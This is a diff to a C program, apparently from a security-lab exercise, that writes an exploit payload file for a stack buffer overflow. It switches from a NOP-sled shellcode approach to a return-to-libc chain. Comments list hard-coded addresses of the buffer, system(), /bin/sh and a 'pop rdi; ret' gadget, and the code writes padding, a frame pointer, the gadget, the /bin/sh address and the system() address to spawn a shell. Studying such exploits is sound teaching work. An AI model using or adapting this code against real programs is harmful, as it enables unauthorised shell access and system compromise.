@@ -4,16 +4,29 @@
 
 unsigned char* littleEndian(char *str, int numChars);
 
-// 0x7fffffffdc30 address of buf
+// 0x7fffffffdc30 address of buf according to gdb
 // 0x7ffff7b99673 address of /bin/sh/
-// 0x7fffffffdca0
+// 0x7fffffffdca0 <- start of buf according to a.out
+// 0x7ffff7a48070 <- Address of system library call in libc
 
+// 0x7ffff7a47ae0 <- address of do_system in libc
+
+// 0x7fffffffdc60 original rbp -> set that into the fp.
+
+//
+// 0x7ffff7baa5d5 <- 0x5f 0xc3 (gadget) pop %rdi  retq
+//
+
+// prev fp value: 0x400550 prev fp address: 0x7fffffffdc60
+
+
+// 0x7ffff7a2188a <- original return when main calls puts
 
 #define ADDR_SIZE 64
+#define BITS_IN_BYTE 8
 
 int main(int argc, char *argv[]){
   FILE *file = fopen("in", "wb");
-  FILE *instFp;
   int fileSize;
   int i;
   char ch = 0x90;
@@ -21,97 +34,93 @@ int main(int argc, char *argv[]){
   char input;
   int numChars;
   unsigned char *instFile;
-  unsigned char *addr = malloc(10);
-  unsigned char *shAddr = malloc(8);
+  unsigned char *mainRet;
+  unsigned char *retAddr;
+  unsigned char *shAddr;
+  unsigned char *sysAddr;
+  unsigned char *fpAddr;
 
   //strcpy(addr, "0x7fffffffdc30");
 
- 
-  shAddr = littleEndian("0x7ffff7b99678", 8);
+  //fp address
+  //fpAddr = littleEndian("0x7fffffffdd48", 8);
+  fpAddr = littleEndian("0x7fffffffdc00", 8);
+  //fpAddr = littleEndian("0x400630", 8);
+  
+  //value of prev fp
+  mainRet = littleEndian("0x7ffff7a2188a", 8);
+  //mainRet = littleEndian("0x7fffffffdd48", 8);
+  
+  //address of /bin/sh in little endian
+  shAddr = littleEndian("0x7ffff7b99673", 8);
 
+  //address of system library call little endian
+  sysAddr = littleEndian("0x7ffff7a48070", 8);
 
-
-
-  printf("\n");
-  strcpy(addr, "0x7fffffffdcb0");
-  //BELOW ADDRESS WORKS
-  //strcpy(addr, "0x7fffffffdce0");
+  //address of gadget
+  retAddr = littleEndian("0x7ffff7baa5d5", 8); 
+  
 
   unsigned char *byteAddr;
 
-  if(argc != 4){
-    printf("Wrong number of arguments, use ./gen [instructions] [num_bytes_in_buffer] [entry_point]\n");
-    printf("Instructions: file of instructions to be run. Size must not exceed num_bytes_in_buffer. Expected to be in hex.\n");
+  if(argc != 2){
+    printf("Wrong number of arguments, use ./gen [num_bytes_in_buffer]\n");
     printf("num_bytes_in_buffer: number of bytes in the buffer (assumes buffer is first local variable).\n");
-    printf("entry_point: hex value of desired entry point, format: 0x12345678.\n");
     exit(1);
   }
 
-  instFile = argv[1];
-  numChars = atoi(argv[2]) - 8; //subtract 8 bytes as we are putting 16 bytes of arguments at beginning of buffer
-  
-
-  instFp = fopen(instFile, "rb");
-
+  numChars = atoi(argv[1]); //+8 bytes for fp 
   
   if(file == NULL){
     printf("Error opening file. Exiting.");
     exit(1);
   }
 
-  if (instFp == NULL){
-    printf("Error opening instruction file. Exiting.");
-    exit(1);
-  }
-
-  //find out how many characters are in instruction file
-  fseek(instFp, 0L, SEEK_END);
-  fileSize = ftell(instFp);
-  rewind(instFp);
+  char cRef = 'a';
   
-  //exit if we can't fit instructions in buffer
-  if(fileSize > numChars){
-    printf("Instruction set size cannot exceed number of characters in buffer.");
-    exit(1);
-  }
-  
-  //write address of 'sh' in libc memory to file first
-  for(i = 0; i < 8; i++){
-    fwrite(shAddr+i, 1, 1, file);    
-  }
-
-  //write 8 null characters to signify end of args for execve
-  for(i = 0; i < 8; i++){
-    fwrite(&nul, 1, 1, file);
-  }
-
   //write nop sled up to number of characters
-  for(i = fileSize; i < numChars; i++){
-    fwrite(&ch, 1, 1, file);
-  } 
-  
-  int j = 0;
-  while(j < fileSize){
-    input = fgetc(instFp);
-    putc(input, file);
-    j++;
+  for(i = 1; i <= numChars; ++i){
+    fwrite(&cRef, 1, 1, file);
+    if( 0 == i % 8 )
+      cRef++;    // Key to finding errors.
   }
   
-  //fwrite(instructions, sizeof(char), fileSize, file);
-     
-  /* fill buffer */
+  //unsigned char * pTemp = littleEndian("0x1", 8);
+  unsigned char* pTemp = littleEndian( "0x400550", 8 );
+  //
+  //fwrite(mainRet, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
+  fwrite(fpAddr, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
+  //write return address
+  fwrite(retAddr, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
+  //write address of /bin/sh
+  fwrite(shAddr, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
+  //write address of 'system' library call
+  fwrite(sysAddr, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
 
-  //-2 for the 0x at the start of the string
-  byteAddr = littleEndian(addr, strlen(addr) - 2);
-
-  int numWritten = fwrite(byteAddr, sizeof(char), ADDR_SIZE / 8, file);
-
-  printf("%d\n", numWritten);
+  //fwrite(littleEndian("0x1", 8), 1, 8, file);
+  //fwrite(littleEndian("0x7fffffffde28", 8), 1, 8, file);
   
-  free(byteAddr);
+  //rewrite original FP
+  fwrite(pTemp, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
+  
+  //rewrite original return address
+  fwrite(mainRet, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
+
+
+  
+
+  
+  
+  free(pTemp);
+  free(mainRet);
+  free(retAddr);
+  free(shAddr);
+  free(sysAddr);
+  free(fpAddr);
 
   fclose(file); 
 }
+
 
 //consider passing output through a parameter & returning size of returned array.
 unsigned char* littleEndian(char *addr, int numBytes){
